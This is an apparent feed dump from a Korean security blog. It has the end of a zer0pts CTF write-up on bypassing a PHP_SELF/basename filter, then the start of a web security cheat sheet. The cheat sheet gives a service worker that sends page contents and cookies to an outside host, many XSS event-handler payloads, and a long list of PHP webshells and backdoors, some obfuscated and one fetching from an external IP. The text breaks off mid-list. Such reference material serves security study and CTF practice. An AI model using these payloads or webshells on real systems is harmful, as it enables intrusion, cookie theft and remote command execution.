class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$secret</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">64</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$guess</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">hash_equals</span>(<span class="variable">$secret</span>, <span class="variable">$guess</span>)) &#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&#x27;Congratulations! The flag is: &#x27;</span> . FLAG;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;Can you guess it?&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;h1&gt;Can you guess it?&lt;/h1&gt;</span><br><span class="line">    &lt;p&gt;If your guess is correct, I<span class="string">&#x27;ll give you the flag.&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;&lt;a href=&quot;?source&quot;&gt;Source&lt;/a&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;hr&gt;</span></span><br><span class="line"><span class="string">&lt;?php if (isset($message)) &#123; ?&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;&lt;?= $message ?&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;?php &#125; ?&gt;</span></span><br><span class="line"><span class="string">    &lt;form action=&quot;index.php&quot; method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">      &lt;input type=&quot;text&quot; name=&quot;guess&quot;&gt;</span></span><br><span class="line"><span class="string">      &lt;input type=&quot;submit&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;/form&gt;</span></span><br><span class="line"><span class="string">  &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure><p>게싱을 가장한 필터 바이패스 문제입니다.</p><table><thead><tr><th>Path</th><th>PHP_SELF</th></tr></thead><tbody><tr><td>&#x2F;</td><td>index.php</td></tr><tr><td>&#x2F;index.php</td><td>index.php</td></tr><tr><td>&#x2F;index.php&#x2F;config.php</td><td>index.php&#x2F;config.php</td></tr></tbody></table><p>먼저 우리는 <code>PHP_SELF</code>가 조작될 수 있는 값이라는 것을 알아야 합니다.</p><p>따라서 index.php 가 붙은 앞부분은 어쩔 수 없지만, 뒷부분은 자유롭게 컨트롤 가능하므로 basename 함수를 통해 highlight_file 함수 인자로 전달되므로 <code>index.php/config.php</code> 는 <code>config.php</code> 를 출력하게 만듭니다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/config\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>그러나 여기서 문제가 발생합니다.<br>정규식 필터링을 수행하고 있는데 이에 걸리면 즉시 종료됩니다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php &gt; <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">basename</span>(<span class="string">&quot;index.php/config.php/\xbb&quot;</span>));</span><br><span class="line"><span class="comment">// &quot;config.php&quot;</span></span><br></pre></td></tr></table></figure><p>그러나 php는 우리를 배신하지 않습니다.<br>basename 함수는 뒤에 오는 <code>[\x80-\xff]</code> 범위의 문자열에 대해서는 철저히 무시합니다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// http://3.112.201.75:8003/index.php/config.php/%bb?source</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;FLAG&#x27;</span>, <span class="string">&#x27;zer0pts&#123;gu3ss1ng_r4nd0m_by73s_1s_un1n73nd3d_s0lu710n&#125;&#x27;</span>);</span><br></pre></td></tr></table></figure><p>따라서 위 주소를 통해 플래그를 읽어올 수 있습니다.</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://ctftime.org/event/1006&quot;&gt;https://ctftime.org/event/1006&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&quot;/img/2020/03/image-202003090849
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Web Security CheatSheet</title>
    <link href="https://blog.p6.is/Web-Security-CheatSheet/"/>
    <id>https://blog.p6.is/Web-Security-CheatSheet/</id>
    <published>2020-02-26T18:51:17.000Z</published>
    <updated>2022-10-14T13:04:25.645Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>This document is continuously updated.</p></blockquote><h2 id="cross-site-scripting"><a href="#cross-site-scripting" class="headerlink" title="cross site scripting"></a>cross site scripting</h2><ul><li><p><a href="http://portswigger.net/web-security/cross-site-scripting/cheat-sheet">http://portswigger.net/web-security/cross-site-scripting/cheat-sheet</a></p></li><li><p>basic filter bypass</p></li><li><p>samesite cookie bypass</p></li><li><p>client side template injection</p><ul><li>angularjs</li><li>nodejs : ejs, pug nunjucks .. etc</li></ul></li><li><p>jsonp injection</p><ul><li>bom injection</li></ul></li><li><p>dom clobbering</p></li><li><p>uxss</p><ul><li><a href="https://github.com/posixlee/uxss-db">https://github.com/posixlee/uxss-db</a></li></ul></li><li><p>open redirection</p><ul><li>oauth</li><li>csrf gadget</li></ul></li><li><p>service worker </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- page.html --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">if</span> (<span class="string">&#x27;serviceWorker&#x27;</span> <span class="keyword">in</span> navigator) &#123;</span></span><br><span class="line"><span class="language-javascript">        navigator.<span class="property">serviceWorker</span>.<span class="title function_">register</span>(<span class="string">&#x27;/ex.js&#x27;</span>, &#123; <span class="attr">scope</span>: <span class="string">&#x27;/&#x27;</span> &#125;)</span></span><br><span class="line"><span class="language-javascript">            .<span class="title function_">then</span>(<span class="keyword">function</span> (<span class="params">registration</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Registration successful, scope is:&#x27;</span>, registration.<span class="property">scope</span>);</span></span><br><span class="line"><span class="language-javascript">            &#125;)</span></span><br><span class="line"><span class="language-javascript">            .<span class="title function_">catch</span>(<span class="keyword">function</span> (<span class="params">error</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Service worker registration failed, error:&#x27;</span>, error);</span></span><br><span class="line"><span class="language-javascript">            &#125;);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ex.js</span></span><br><span class="line">self.<span class="title function_">addEventListener</span>(<span class="string">&#x27;fetch&#x27;</span>, <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Fetching:&#x27;</span>, event.<span class="property">request</span>.<span class="property">url</span>);</span><br><span class="line">    </span><br><span class="line">    event.<span class="title function_">respondWith</span>(</span><br><span class="line">        <span class="title function_">fetch</span>(event.<span class="property">request</span>.<span class="property">url</span>)</span><br><span class="line">            .<span class="title function_">then</span>(<span class="keyword">function</span> (<span class="params">response</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> response.<span class="title function_">text</span>();</span><br><span class="line">            &#125;)</span><br><span class="line">            .<span class="title function_">then</span>(<span class="keyword">function</span> (<span class="params">text</span>) &#123;</span><br><span class="line">                <span class="title function_">fetch</span>(<span class="string">&#x27;//rwx.kr/?data=&#x27;</span> + <span class="built_in">encodeURI</span>(event.<span class="property">request</span>.<span class="property">url</span>));</span><br><span class="line">                <span class="title function_">fetch</span>(<span class="string">&#x27;//rwx.kr/?data=&#x27;</span> + <span class="built_in">encodeURI</span>(text));</span><br><span class="line">                <span class="title function_">fetch</span>(<span class="string">&#x27;//rwx.kr/?data=&#x27;</span> + <span class="built_in">encodeURI</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>));</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Response</span>(text, &#123; <span class="attr">headers</span>: &#123; <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;text/html&#x27;</span> &#125; &#125;);</span><br><span class="line">            &#125;)</span><br><span class="line">    );</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li><li><p>chrome gold feature</p><ul><li><p>PNaCL</p><ul><li>이제 안통함 (아마 76버전까지?)</li><li><a href="https://github.com/posixlee/PNaCl_Leaker">https://github.com/posixlee/PNaCl_Leaker</a></li></ul></li><li><p>Chromium-Intercept</p><ul><li>deface 에 쓰일 수 있음</li><li>응답 헤더가 <code>text/cache-manifest</code> 이어야 한다는 제한 사항이 있음</li><li>최신 버전에서 패치됨<ul><li><a href="https://www.chromestatus.com/feature/5125554036539392">https://www.chromestatus.com/feature/5125554036539392</a></li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CHROMIUM CACHE MANIFEST </span><br><span class="line">CACHE: </span><br><span class="line">NETWORK:  </span><br><span class="line">FALLBACK: </span><br><span class="line">CHROMIUM-INTERCEPT: </span><br><span class="line">/ return /uploaded.html</span><br></pre></td></tr></table></figure></li></ul></li><li><p>library</p><ul><li>jquery <code>$.getJSON</code></li></ul></li><li><p>crlf injection</p><ul><li>urldecode</li><li>urldecode while http -&gt; https redirect (misconfigure)</li><li>http&#x2F;2 mitigation<ul><li>연구 필요</li></ul></li></ul></li><li><p>csp bypass</p><ul><li>jsonp endpoints</li><li>unsafe-eval</li><li>client side template injection</li><li>response status code change e.g. 201</li><li><a href="https://csp-evaluator.withgoogle.com/">https://csp-evaluator.withgoogle.com/</a></li><li><a href="https://www.hackinbo.it/slides/1494231338_Spagnuolo_Hack%20In%20Bo%20-%20So%20we%20broke%20all%20CSPs...%20You%20won%27t%20guess%20what%20happened%20next%21.pdf">https://www.hackinbo.it/slides/1494231338_Spagnuolo_Hack%20In%20Bo%20-%20So%20we%20broke%20all%20CSPs...%20You%20won%27t%20guess%20what%20happened%20next%21.pdf</a></li></ul></li><li><p>autofocus with contenteditable</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">type</span>=<span class="string">contenteditable</span> <span class="attr">autofocus</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>browser dependent</p><ul><li><p>Chrome, Opera, Safari and Edge</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">onfocus</span>=<span class="string">&quot;alert(1)&quot;</span> <span class="attr">contenteditable</span> <span class="attr">tabindex</span>=<span class="string">&quot;0&quot;</span> <span class="attr">id</span>=<span class="string">&quot;xss&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;-webkit-user-modify:read-write&quot;</span> <span class="attr">onfocus</span>=<span class="string">&quot;alert(1)&quot;</span> <span class="attr">id</span>=<span class="string">&quot;xss&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;-webkit-user-modify:read-write-plaintext-only&quot;</span> <span class="attr">onfocus</span>=<span class="string">&quot;alert(1)&quot;</span> <span class="attr">id</span>=<span class="string">&quot;xss&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>Firefox</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">onbeforescriptexecute</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>1<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>MSIE10&#x2F;11 &amp; Edge</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;-ms-scroll-limit:1px;overflow:scroll;width:1px&quot;</span> <span class="attr">onscroll</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>MSIE10</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">contenteditable</span> <span class="attr">onresize</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>MSIE11</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">onactivate</span>=<span class="string">&quot;alert(1)&quot;</span> <span class="attr">id</span>=<span class="string">&quot;xss&quot;</span> <span class="attr">style</span>=<span class="string">&quot;overflow:scroll&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">onfocus</span>=<span class="string">&quot;alert(1)&quot;</span> <span class="attr">id</span>=<span class="string">&quot;xss&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display:table&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;xss&quot;</span> <span class="attr">style</span>=<span class="string">&quot;-ms-block-progression:bt&quot;</span> <span class="attr">onfocus</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;xss&quot;</span> <span class="attr">style</span>=<span class="string">&quot;-ms-layout-flow:vertical-ideographic&quot;</span> <span class="attr">onfocus</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;xss&quot;</span> <span class="attr">style</span>=<span class="string">&quot;float:left&quot;</span> <span class="attr">onfocus</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>Chrome, Opera, Safari</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"><span class="keyword">@keyframes</span> x&#123;&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;animation-name:x&quot;</span> <span class="attr">onanimationstart</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>Chrome, Opera, Safari</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-tag">div</span> &#123;<span class="attribute">width</span>: <span class="number">100px</span>;&#125;</span></span><br><span class="line"><span class="language-css"><span class="selector-tag">div</span><span class="selector-pseudo">:target</span> &#123;<span class="attribute">width</span>: <span class="number">200px</span>;&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;xss&quot;</span> <span class="attr">onwebkittransitionend</span>=<span class="string">&quot;alert(1)&quot;</span> <span class="attr">style</span>=<span class="string">&quot;-webkit-transition: width .1s;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>Safari</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;overflow:-webkit-marquee&quot;</span> <span class="attr">onscroll</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul></li></ul><h2 id="client-side-request-forgery"><a href="#client-side-request-forgery" class="headerlink" title="client side request forgery"></a>client side request forgery</h2><ul><li>xhr 또는 fetch 를 사용하여, 다른 페이지 데이터 가져올 수 있음</li><li>a tag ping attribute</li><li>30? : redirect with post data preserve<ul><li>연구 필요</li></ul></li><li>XS-Leaks<ul><li>[설명추가예정 : 방법 다양함]</li></ul></li></ul><h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><ul><li><p>webshell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]); <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]); <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;`<span class="subst">$_GET</span>[1]`&quot;</span>); <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?=</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[cmd]);</span><br><span class="line"><span class="meta">&lt;?=</span>`<span class="variable">$_GET</span>[<span class="number">1</span>]`;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[cmd]);<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> `<span class="variable">$_GET</span>[<span class="number">1</span>]`;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">passthru</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="title function_ invoke__">str_rot13</span>(<span class="string">&#x27;riny($_CBFG[cntr]);&#x27;</span>));<span class="meta">?&gt;</span></span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="title function_ invoke__">system</span>(<span class="string">&quot;id&quot;</span>); &lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>](<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]); <span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">// a=system&amp;b=ls</span></span><br><span class="line"><span class="comment">// a=assert&amp;b=system(&quot;ls&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">array_map</span>(<span class="string">&quot;ass\x65rt&quot;</span>,(<span class="keyword">array</span>)<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">// .php?cmd=system(&quot;ls&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?</span>@<span class="title function_ invoke__">extract</span>(<span class="variable">$_REQUEST</span>);@<span class="keyword">die</span>(<span class="variable">$f</span>(<span class="variable">$c</span>));<span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">// .php?f=system&amp;c=id</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">include</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;u&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);  </span><br><span class="line"><span class="comment">// 構造 &lt;form action=&quot;http://x.x.x.x/shell.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;上傳</span></span><br><span class="line"><span class="comment">// 把暫存檔include進來</span></span><br><span class="line"><span class="comment">// From: http://www.zeroplace.cn/article.asp?id=906</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$x</span>=~¾¬¬º­«;<span class="variable">$x</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]); <span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">// not backdoor (assert)</span></span><br><span class="line"><span class="comment">// .php?a=system(&quot;ls&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">&#123;$&#123;phpinfo()&#125;</span>&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;$&#123;system(ls)&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> Y2F0IGZsYWc= | base64 -d | sh</span><br><span class="line"><span class="comment">// Y2F0IGZsYWc=   =&gt;  cat  flag</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> -e <span class="string">&quot;&lt;?php passthru(\$_POST[1])?&gt;;\r&lt;?php echo &#x27;A PHP Test &#x27;;&quot;</span> &gt; shell.php</span><br><span class="line"><span class="comment">// cat shell.php</span></span><br><span class="line"><span class="comment">// &lt;?php echo &#x27;A PHP Test &#x27;;&quot; ?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> ^<span class="meta">&lt;?php</span> <span class="keyword">eval</span>^(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]^); ?^&gt; &gt; a.php</span><br><span class="line"><span class="comment">// Windows echo導出一句話</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">fwrite</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;gggg.php&quot;</span>,<span class="string">&quot;w&quot;</span>),<span class="string">&quot;&lt;?php system(\$_GET[&#x27;a&#x27;]);&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;HTTP/1.1 404&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">ob_start</span>();</span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line"><span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">// 無回顯後門  </span></span><br><span class="line"><span class="comment">// e.g. ?pass=file_get_contents(&#x27;http://15.165.0.114/test&#x27;)</span></span><br><span class="line"><span class="title function_ invoke__">ob_start</span>(<span class="string">&#x27;assert&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">ob_end_flush</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?=</span></span><br><span class="line"><span class="comment">// 沒有英數字的webshell</span></span><br><span class="line">$💩 = <span class="string">&#x27;[[[[@@&#x27;</span> ^ <span class="string">&#x27;(&quot;(/%-&#x27;</span>;</span><br><span class="line">$💩((<span class="string">&#x27;@@[&#x27;</span>^<span class="string">&#x27;#!/&#x27;</span>).<span class="string">&quot; /????&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">A=fl;B=ag;cat $A<span class="variable">$B</span></span><br></pre></td></tr></table></figure></li><li><p>disable function history</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// isitdtu</span><br><span 